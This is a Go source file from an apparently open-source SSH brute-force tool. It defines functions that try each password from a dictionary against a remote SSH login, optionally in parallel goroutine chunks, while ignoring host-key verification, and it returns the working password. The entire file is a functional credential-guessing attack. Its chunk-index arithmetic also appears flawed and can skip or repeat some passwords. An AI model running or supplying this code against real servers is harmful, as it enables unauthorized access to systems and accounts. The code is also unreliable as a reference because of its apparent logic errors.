package sshatk

import (
	"errors"
	"fmt"
	"net"
	"strings"
	"sync"

	"github.com/cfschilham/autossh/internal/loadcfg"
	"golang.org/x/crypto/ssh"
)

const authErrSubstring = "ssh: handshake failed: ssh: unable to authenticate"

// SSHConn attempts to connect to the remote host using the passed values. The variable
// host should be an IP, username a remote username, port the remote port (typically 22)
// and pwd the corresponding password. A successful connection means a nil error is returned.
// It does not do anything except dial the remote host to see if the credentials work.
func SSHConn(host, username, port, pwd string) error {
	clientConfig := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(pwd),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect to remote host.
	conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), clientConfig)
	if err != nil {
		return fmt.Errorf("internal/sshconn: %s", err.Error())
	}
	conn.Close()
	return nil
}

// sendAfterWGWait returns a channel which is passed true after wg.Wait() finishes. Can be
// used to use a waitgroup in a select statement
func sendAfterWGWait(wg *sync.WaitGroup) chan bool {
	c := make(chan bool, 1)
	go func(wg *sync.WaitGroup, c chan bool) {
		wg.Wait()
		c <- true
	}(wg, c)
	return c
}

// SSHDictMT is similar to SSHDict, but multi-threaded. It does not take a *loadcfg.Dict type
// for passwords because it spawns a new goroutine for each password in pwd, and spawning a new
// goroutine for every dictionary entry might cause stability issues.
//
// A non-empty string and a nil error is returned in following a successful connection by one
// of the goroutines. If the connection is unsuccesfull it will return either a dictionary
// authentication error, meaning the password was most likely not in the passed password list,
// or another connection error meaning the host is down, for example.
func SSHDictMT(host loadcfg.Host, config *loadcfg.Config, pwds []string) (string, error) {
	// If found, the password is sent on channel pwdChan, and any non-auth errors are sent
	// over errChan. Both are buffered to 1 entry because when a non-auth error or found
	// password is received, there is no point in continueing.
	pwdChan, errChan := make(chan string, 1), make(chan error, 1)

	// A waitgroup is created. If <-sendAfterWGWait(&sshWaitGroup) receives a value, all goroutines have
	// finished without returning a found password or a non-auth error. Hence the password is not
	// be in the dictionary.
	var sshWaitGroup sync.WaitGroup
	sshWaitGroup.Add(len(pwds))

	// Loop through all passwords which have been passed and spawn a new goroutine for each.
	for _, pwd := range pwds {
		if config.Verbose() {
			fmt.Printf("Trying to connect with password '%s'\n", pwd)
		}

		go func(pwdChan chan string, errChan chan error, host loadcfg.Host, config *loadcfg.Config, pwd string) {
			defer sshWaitGroup.Done()
			if err := SSHConn(host.IP(), host.Username(), config.Port(), pwd); err != nil {
				// If the non-nil error is not an auth error, an error is passed because this means
				// it does not have anything to do with the password being wrong and we want to stop
				// attempting passwords on this host. If it is an auth error, however, we simply move
				// on to the next pwd in pwds
				if !strings.Contains(err.Error(), authErrSubstring) {
					errChan <- err
				}
				return
			}
			pwdChan <- pwd
		}(pwdChan, errChan, host, config, pwd)
	}

	select {
	case pwd := <-pwdChan:
		return pwd, nil
	case err := <-errChan:
		return "", err
	case <-sendAfterWGWait(&sshWaitGroup):
		return "", errors.New("internal/sshconn: unable to authenticate with dictionary")
	}

}

// SSHDict attempts to establish a connection to the given host, in the form of a loadcfg.Host.
// A *loadcfg.Config must be passed to determine if the attack should be multi-threaded and if
// verbose output should be printed to os.Stdout. The *loadcfg.Dict is the dictionary used for
// the attempted SSH connections.
func SSHDict(host loadcfg.Host, config *loadcfg.Config, dict *loadcfg.Dict) (string, error) {
	if config.MultiThreaded() {
		// Multi-threaded mode

		// Create chunks of threads. This ensures the amount of goroutines never exceeds the amount
		// configured in cfg/config.yml. The index will not go any higher than len(pwds) - max_threads.
		for i := 0; i < len(dict.Pwds())-config.MaxThreads(); i += config.MaxThreads() {
			// Select all entries from i:i + max_threads (max_threads from cfg/config.yml).
			if pwd, err := SSHDictMT(host, config, dict.Pwds()[i:i+config.MaxThreads()]); err != nil {
				// If the non-nil error is not an auth error, an error is passed because this means
				// it does not have anything to do with the password being wrong and we want to stop
				// attempting passwords on this host. If it is an auth error, however, we simply move
				// on to the next chunk of dict.Pwds()
				if err.Error() != "internal/sshconn: unable to authenticate with dictionary" {
					return "", err
				}
				continue
			} else {
				// If the error is nil, the password has been found
				return pwd, nil
			}
		}

		// If there are fewer dictionary entries than max_threads, the first loop is skipped because
		// its condition is not satisfied. We can simply execute a single instance of SSHDictMT()
		// with all the passwords because there aren't more passwords than maximum threads.
		if len(dict.Pwds()) < config.MaxThreads() {
			pwd, err := SSHDictMT(host, config, dict.Pwds())
			if err != nil {
				return "", err
			}
			// If the error is nil, the password has been found
			return pwd, nil
		}

		// Continue where the first loop left off, this loop contains fewer entries than max_threads from
		// config.
		idx := len(dict.Pwds()) - config.MaxThreads() + 1 // One further than the last one from the previous loop.

		pwd, err := SSHDictMT(host, config, dict.Pwds()[idx:])
		if err != nil {
			return "", err
		}
		// If the error is nil, the password has been found
		return pwd, nil

	}
	// Single-threaded mode

	// Loop through all entries of the dictionary.
	for _, pwd := range dict.Pwds() {
		if config.Verbose() {
			fmt.Printf("Trying to connect with password '%s'\n", pwd)
		}

		if err := SSHConn(host.IP(), host.Username(), config.Port(), pwd); err != nil {
			// If the non-nil error is not an auth error, an error is passed because this means
			// it does not have anything to do with the password being wrong and we want to stop
			// attempting passwords on this host. If it is an auth error, however, we simply move
			// on to the next pwd in pwds
			if !strings.Contains(err.Error(), authErrSubstring) {
				return "", fmt.Errorf("internal/sshconn: %s", err.Error())
			}
			continue
		}
		return pwd, nil
	}
	// If this point is reached all passwords in the dictionary have been tried and all returned an auth error.
	return "", errors.New("internal/sshconn: unable to authenticate with dictionary")
}
